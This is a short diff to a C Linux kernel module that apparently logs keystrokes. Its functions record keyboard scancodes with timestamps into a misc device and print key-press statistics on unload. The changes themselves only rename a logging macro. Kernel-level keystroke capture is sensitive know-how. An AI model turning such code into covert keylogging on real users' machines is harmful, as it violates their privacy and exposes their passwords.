@@ -98,7 +98,7 @@ static int register_device(void) {
 
 	int res = misc_register(&misc);
 	if (res < 0) {
-		LOGF("failed to register - error code: %d", res);
+		LOG("failed to register - error code: %d", res);
 		return res;
 	}
 	LOG("registered device");
@@ -139,7 +139,7 @@ static void add_entry(int scancode, int release, struct rtc_time *time) {
 		device_size += len;
 	}
 
-	LOGF("%s", entry);
+	LOG("%s", entry);
 	if (!release)
 		STAT(scancode);
 }
@@ -187,8 +187,8 @@ void __exit m_exit(void) {
 	}
 	if (sum > 0) {
 		int ratio = (stats[max]*100)/sum;
-		LOGF("you pressed %d keys", sum);
-		LOGF("most pressed key is '%s': %d times (%d%%) !", kbus[max], stats[max], ratio);
+		LOG("you pressed %d keys", sum);
+		LOG("most pressed key is '%s': %d times (%d%%) !", kbus[max], stats[max], ratio);
 	} else {
 		LOG("you pressed no keys :(");
 	}
